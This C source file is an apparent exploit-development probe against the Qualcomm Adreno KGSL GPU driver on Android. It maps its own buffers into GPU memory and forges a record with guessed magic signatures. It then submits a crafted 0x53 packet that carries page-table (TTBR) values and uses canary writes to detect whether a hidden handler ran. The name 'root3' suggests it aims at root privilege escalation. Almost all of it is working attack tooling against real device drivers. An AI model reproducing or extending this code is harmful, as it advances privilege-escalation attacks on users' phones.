/* kgsl_root3.c — 自造记录 + 0x53 派发判定
 * payload = {ttbr_lo, ttbr_hi, rec_lo, rec_hi}; rec = 我们自己映射的 4KB 缓冲(GPU VA)
 * variant 0: 记录首块填错魔数  → 若 handler 真运行 → 撞 0x2eb3 死循环(GPU 卡死)
 *                              → 若被丢弃 → 静默退役, canary 正常
 * variant 1: 首块填 0xFADEBAC9 → 过 0x1cea 签名, 看后续行为
 * 每次提交带 canary(MEM_WRITE), 之后再单独提交一次 canary2 测存活
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

static int fd; static uint64_t g_clsz;
static uint32_t *ib; static uint64_t ib_ga;
static uint8_t *rec; static uint64_t rec_ga; static uint32_t ctx;
static void cvac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc cvac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static void civac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc civac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static double now_s(void){ struct timespec t; clock_gettime(CLOCK_MONOTONIC,&t); return t.tv_sec+t.tv_nsec/1e9; }
static void ctx_create(void){ struct kgsl_drawctxt_create r={.flags=0x1812};
  if(!ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE,&r)) ctx=r.drawctxt_id; }
static void ctx_recreate(void){ ioctl(fd,IOCTL_KGSL_DRAWCTXT_DESTROY,&(struct kgsl_drawctxt_destroy){.drawctxt_id=ctx}); ctx_create(); }
static int submit(uint64_t ga, uint32_t size, uint32_t *ts){
    struct kgsl_command_object c; struct kgsl_gpu_command r;
    memset(&c,0,sizeof(c)); c.flags=KGSL_CMDLIST_IB; c.gpuaddr=ga; c.size=size;
    memset(&r,0,sizeof(r)); r.context_id=ctx; r.cmdsize=sizeof(c); r.numcmds=1; r.cmdlist=(unsigned long)&c;
    int e=ioctl(fd,IOCTL_KGSL_GPU_COMMAND,&r); if(ts)*ts=r.timestamp; return e; }
static uint64_t wait_ts(uint32_t ts, uint32_t ms){
    struct{uint32_t c,t,to;}w={ctx,ts,ms}; double t0=now_s();
    ioctl(fd,_IOWR(0x09,0x07,char[12]),&w);
    return (uint64_t)((now_s()-t0)*1000); }
static int mapb(void **h,size_t len,uint64_t *ga){
    void*p=mmap(NULL,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(p==MAP_FAILED) return 1; memset(p,0,len);
    struct kgsl_map_user_mem m; memset(&m,0,sizeof(m));
    m.len=len; m.hostptr=(unsigned long)p; m.memtype=KGSL_USER_MEM_TYPE_ADDR;
    if(ioctl(fd,IOCTL_KGSL_MAP_USER_MEM,&m)) return 1;
    *h=p; *ga=m.gpuaddr; return 0; }

#define R1_OFF  0xA00
#define REC_FLD(off) (*(uint32_t*)(rec + (off)))

static void build_record(int variant) {
    memset(rec, 0, 0x1000);
    /* 7 组 {addr_lo, count}(hi 来自 payload[3]) —— 全部指向我们块区 */
    REC_FLD(0x320 + 0x34) = (uint32_t)(rec_ga + R1_OFF);  REC_FLD(0x320 + 0x38) = 8;   /* R1 */
    REC_FLD(0x320 + 0x2c) = (uint32_t)(rec_ga + R1_OFF + 0x40); REC_FLD(0x320 + 0x30) = 8; /* R2 */
    REC_FLD(0x320 + 0x24) = (uint32_t)(rec_ga + R1_OFF + 0x80); REC_FLD(0x320 + 0x28) = 8; /* R3 */
    REC_FLD(0x320 + 0x1c) = (uint32_t)(rec_ga + R1_OFF + 0xc0); REC_FLD(0x320 + 0x20) = 8; /* R4 */
    REC_FLD(0x320 + 0x14) = (uint32_t)(rec_ga + R1_OFF + 0x100); REC_FLD(0x320 + 0x18) = 8; /* R5 */
    REC_FLD(0x320 + 0x0c) = (uint32_t)(rec_ga + R1_OFF + 0x140); REC_FLD(0x320 + 0x10) = 8; /* R6 */
    REC_FLD(0x320 + 0x00) = 8;   /* INL9a8 count */

    uint32_t m0 = (variant == 0) ? 0xDEADBEEFu : 0xFADEBAC9u;
    uint32_t *b1 = (uint32_t*)(rec + R1_OFF);
    for (int i = 0; i < 8; i++) b1[i] = (i == 0) ? m0 : 0x10000000u + (uint32_t)i;
    /* 其余块: 各自魔数(猜测顺序) + 递增值, 便于观察哪个落到寄存器 */
    uint32_t magics[6] = { 0xFADEBAC9u, 0xFADEBAC8u, 0xFADEBACAu, 0xFADEBAC7u, 0xFADEBAC6u, 0xFADEBAC4u };
    for (int k = 0; k < 5; k++) {
        uint32_t *b = (uint32_t*)(rec + R1_OFF + 0x40*(k+1));
        for (int i = 0; i < 8; i++) b[i] = (i == 0) ? magics[k+1] : 0x20000000u + 0x1000u*(uint32_t)k + (uint32_t)i;
    }
    /* 内联块 */
    uint32_t *i688 = (uint32_t*)(rec + 0x688);
    for (int i = 0; i < 199; i++) i688[i] = (i == 0) ? 0xFADEBAC7u : ((i == 1) ? 0xFADEBAC5u : 0);
    uint32_t *i9a8 = (uint32_t*)(rec + 0x9a8);
    for (int i = 0; i < 8; i++) i9a8[i] = (i == 0) ? 0xFADEBAC6u : 0x30000000u + (uint32_t)i;
    uint32_t *i3c4 = (uint32_t*)(rec + 0x3c4);
    for (int i = 0; i < 40; i++) i3c4[i] = (i == 0) ? 0xFADEBAC0u : 0;
    cvac(rec, rec + 0x1000);
}

static void run_variant(int variant) {
    build_record(variant);
    *(uint32_t*)(rec + 0xF00) = 0; *(uint32_t*)(rec + 0xF04) = 0;
    cvac(rec + 0xF00, rec + 0xF08);

    uint32_t *c = ib;
    *c++ = cp_type7_packet(0x53, 4);
    *c++ = 0;                                             /* ttbr lo */
    *c++ = 0;                                             /* ttbr hi */
    *c++ = (uint32_t)(rec_ga & 0xFFFFFFFFu);              /* rec lo */
    *c++ = (uint32_t)(rec_ga >> 32);                      /* rec hi */
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = (uint32_t)((rec_ga + 0xF00) & 0xFFFFFFFFu);
    *c++ = (uint32_t)((rec_ga + 0xF00) >> 32);
    *c++ = 0xCAFEBABEu;                                   /* canary1 */
    uint32_t dw = (uint32_t)(c - ib);
    cvac(ib, (char*)ib + dw*4);
    uint32_t ts = 0;
    int r = submit(ib_ga, dw*4, &ts);
    uint64_t ms = wait_ts(ts, 4000);
    civac(rec + 0xF00, rec + 0xF08);
    uint32_t can1 = *(uint32_t*)(rec + 0xF00);

    /* 存活测试: 单独再提交一次 canary2 */
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = (uint32_t)((rec_ga + 0xF04) & 0xFFFFFFFFu);
    *c++ = (uint32_t)((rec_ga + 0xF04) >> 32);
    *c++ = 0xCAFEBABFu;
    uint32_t dw2 = (uint32_t)(c - ib);
    cvac(ib, (char*)ib + dw2*4);
    uint32_t ts2 = 0;
    int r2 = submit(ib_ga, dw2*4, &ts2);
    uint64_t ms2 = wait_ts(ts2, 4000);
    civac(rec + 0xF04, rec + 0xF08);
    uint32_t can2 = *(uint32_t*)(rec + 0xF04);

    printf("V%d: submit=%d retire=%llums canary1=0x%08x | 存活批次 submit=%d retire=%llums canary2=0x%08x %s\n",
           variant, r, (unsigned long long)ms, can1, r2, (unsigned long long)ms2, can2,
           (can2 == 0xCAFEBABFu) ? "GPU存活" : "*** GPU 已卡死/失效 ***");
    if (can2 != 0xCAFEBABFu) { printf("   → 变体 %d 触发了 SQE 卡死(handler 真的运行了!)\n", variant); ctx_recreate(); }
}

int main(int argc, char **argv) {
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0":"=r"(ctr)); g_clsz=4<<((ctr>>16)&0xf);
    fd=open("/dev/kgsl-3d0",O_RDWR|O_CLOEXEC); if(fd<0){printf("open fail\n");return 1;}
    if(mapb((void**)&ib,0x1000,&ib_ga)){printf("map ib fail\n");return 1;}
    if(mapb((void**)&rec,0x1000,&rec_ga)){printf("map rec fail\n");return 1;}
    printf("# ib_ga=0x%llx rec_ga=0x%llx (rec hi=0x%08x)\n",
           (unsigned long long)ib_ga,(unsigned long long)rec_ga,(uint32_t)(rec_ga>>32));
    ctx_create();
    int v0 = argc>1 ? atoi(argv[1]) : 0;
    int v1 = argc>2 ? atoi(argv[2]) : 1;
    run_variant(v0);
    run_variant(v1);
    printf("done alive\n");
    return 0;
}
